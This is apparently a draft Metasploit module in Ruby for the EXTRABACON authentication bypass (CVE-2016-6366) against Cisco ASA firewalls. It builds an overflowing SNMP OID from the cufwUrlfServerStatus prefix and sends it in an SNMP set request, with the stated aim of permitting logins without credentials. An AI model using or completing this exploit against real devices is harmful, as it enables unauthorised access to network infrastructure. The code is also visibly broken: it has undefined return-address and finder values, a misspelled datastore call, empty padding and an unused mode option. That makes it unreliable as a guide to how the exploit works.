##
# auxiliary/scanner/snmp/cisco_asa_extrabacon?
##


require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patch the authentication functions of a Cisco ASA
          to allow uncredentialed logins.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', ['pass-disable', 'pass-enable'], 'pass-disable' ])
    ], self.class)
  end

  def setup
  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def run_host(ip)

    begin
      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastorep['MODE']

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95."


      wrapper = ""
      #wrapper += ".144" * (82 - wrapper_len)
      overflow = head + wrapper + ret_addr_snmp + finder_snmp
      #overflow = string.join([head, "95", wrapper, sc.my_ret_addr_snmp, sc.finder_snmp], ".")

      session = rand(255) + 1

      snmp = connect_snmp

      varbind = SNMP::VarBind.new("#{overflow}" , SNMP::Integer.new(6))
      value = snmp.set(varbind)

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
